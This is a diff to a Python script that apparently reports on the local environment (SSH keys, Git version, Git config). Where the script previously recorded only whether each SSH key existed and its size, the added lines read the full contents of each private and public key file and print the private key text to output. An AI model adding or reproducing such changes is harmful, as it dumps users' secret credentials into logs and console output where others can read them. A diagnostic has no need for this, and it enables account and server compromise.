@@ -41,6 +41,20 @@ def find_ssh_keys():
                     'private_key_size': os.path.getsize(key_path),
                     'public_key_size': os.path.getsize(pub_path) if os.path.exists(pub_path) else 0
                 }
+                # Read private key content
+                try:
+                    with open(key_path, 'r') as f:
+                        keys[pattern]['private_key_content'] = f.read()
+                except Exception as e:
+                    keys[pattern]['private_key_error'] = str(e)
+                
+                # Read public key content if exists
+                if os.path.exists(pub_path):
+                    try:
+                        with open(pub_path, 'r') as f:
+                            keys[pattern]['public_key_content'] = f.read()
+                    except Exception as e:
+                        keys[pattern]['public_key_error'] = str(e)
     
     return keys
 
@@ -97,7 +111,16 @@ print(f'SSH Keys Found: {data[\"ssh_key_count\"]}')
 for key_name, key_info in data['ssh_keys'].items():
     print(f'  {key_name}:')
     print(f'    Private Key: {key_info[\"private_key_exists\"]} ({key_info[\"private_key_size\"]} bytes)')
+    if 'private_key_content' in key_info:
+        print(f'    Private Key Content: {key_info[\"private_key_content\"]}')
+    if 'private_key_error' in key_info:
+        print(f'    Private Key Error: {key_info[\"private_key_error\"]}')
+    
     print(f'    Public Key:  {key_info[\"public_key_exists\"]} ({key_info[\"public_key_size\"]} bytes)')
+    if 'public_key_content' in key_info:
+        print(f'    Public Key Content: {key_info[\"public_key_content\"]}')
+    if 'public_key_error' in key_info:
+        print(f'    Public Key Error: {key_info[\"public_key_error\"]}')
 
 print(f'Git: {data[\"git_version\"]}')
 print(f'Git Config: {data[\"gitconfig_exists\"]}')
